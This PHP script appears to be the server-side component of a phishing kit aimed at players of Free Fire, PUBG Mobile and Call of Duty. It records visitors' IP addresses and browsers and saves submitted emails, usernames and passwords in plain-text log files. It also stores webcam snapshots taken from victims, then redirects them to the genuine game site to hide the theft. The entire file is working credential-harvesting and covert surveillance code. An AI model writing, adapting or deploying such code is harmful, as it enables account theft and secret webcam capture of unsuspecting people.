<?php

// Set error reporting
error_reporting(0);

// Get the current date and time
$date = date("Y-m-d");
$time = date("h:i:sa");
$timestamp = date('dMYHis');

// Get the user's IP address
function getIPAddress() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

$ip = getIPAddress();
$useragent = $_SERVER['HTTP_USER_AGENT'];

// Get form data
$email = $_POST['email'] ?? '';
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';
$game = $_GET['game'] ?? 'unknown';

// Create data directory if it doesn't exist
if (!file_exists('data')) {
    mkdir('data', 0777, true);
}

// Handle webcam image if present
if (!empty($_POST['webcam'])) {
    $imageData = $_POST['webcam'];
    if (!empty($imageData)) {
        $filteredData = substr($imageData, strpos($imageData, ",") + 1);
        $unencodedData = base64_decode($filteredData);
        $filename = "data/webcam_{$game}_" . $timestamp . '.png';
        file_put_contents($filename, $unencodedData);
    }
}

// Log IP address and user agent
$ip_log = "data/ip_log.txt";
$ip_entry = "[$date $time] IP: $ip | Game: $game | User-Agent: $useragent\n";
file_put_contents($ip_log, $ip_entry, FILE_APPEND);

// Log credentials if they exist
if ((!empty($email) || !empty($username)) && !empty($password)) {
    $creds_log = "data/credentials.txt";
    $identifier = !empty($email) ? $email : $username;
    $entry = "[$date $time] Game: $game | Login: $identifier | Password: $password | IP: $ip | User-Agent: $useragent\n";
    file_put_contents($creds_log, $entry, FILE_APPEND);
    
    // Log to a separate file for each game
    $game_log = "data/{$game}_log.txt";
    file_put_contents($game_log, $entry, FILE_APPEND);
}

// Redirect based on game
$redirects = [
    'freefire' => 'https://ff.garena.com',
    'pubg' => 'https://www.pubgmobile.com',
    'cod' => 'https://www.callofduty.com',
    'default' => 'https://www.google.com'
];

$redirect_url = $redirects[strtolower($game)] ?? $redirects['default'];

// Send the user to the real game website
header("Location: $redirect_url");
exit();

?>